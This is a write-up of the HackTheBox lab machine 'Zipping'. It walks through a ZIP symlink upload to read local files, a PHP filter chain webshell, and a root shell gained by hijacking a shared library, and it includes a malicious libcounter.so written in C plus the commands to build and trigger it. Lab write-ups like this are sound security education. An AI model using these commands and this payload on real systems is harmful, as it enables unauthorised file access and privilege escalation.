---
title: "HackTheBox: Zipping — Writeup"
date: 2023-09-30 10:00:00 +0200
categories: [HackThebox]
tags: [linux, ctf, Medium-HTB, lfi, zip, symlink, priv-esc]
---

## Overview

**Zipping** is a medium HackTheBox machine. Initial access is via a ZIP file upload that uses a symlink to achieve LFI, then a PHP filter chain to get RCE. Privilege escalation abuses a custom binary with a shared library hijack.

---

## Recon

```bash
nmap -sC -sV -oN nmap/initial 10.10.11.229
```

Port 80 — web shop with a PDF upload feature accepting `.zip` files containing a PDF.

---

## LFI via ZIP Symlink

The application unzips uploaded files and serves the contents. Created a symlink inside a ZIP pointing to `/etc/passwd`:

```bash
ln -s /etc/passwd symlink.pdf
zip --symlinks exploit.zip symlink.pdf
```

Uploaded `exploit.zip` → the app served `/etc/passwd` at the upload path. Confirmed LFI.

---

## RCE via PHP Filter Chain

Targeted PHP source files to find the upload directory, then used a PHP filter chain to write a webshell:

```bash
# Read source via LFI
ln -s /var/www/html/upload.php read.pdf
zip --symlinks read.zip read.pdf
```

Source code revealed the include path. Crafted a filter chain to inject PHP code without needing to write a file directly — used the `php://filter/convert.iconv` chain technique to generate arbitrary PHP content from the filter conversion side effects.

Webshell achieved as `www-data`. Upgraded to full reverse shell.

---

## Privilege Escalation — Shared Library Hijack

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/stock
```

`/usr/bin/stock` is a custom ELF binary. Ran `ldd`:

```bash
ldd /usr/bin/stock
```

```
libcounter.so => /home/rektsu/lib/libcounter.so
```

`/home/rektsu/lib/` is writable. Compiled a malicious `libcounter.so`:

```c
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("bash -p");
}
```

```bash
gcc -shared -fPIC -o /home/rektsu/lib/libcounter.so evil.c
sudo /usr/bin/stock
```

Root shell.
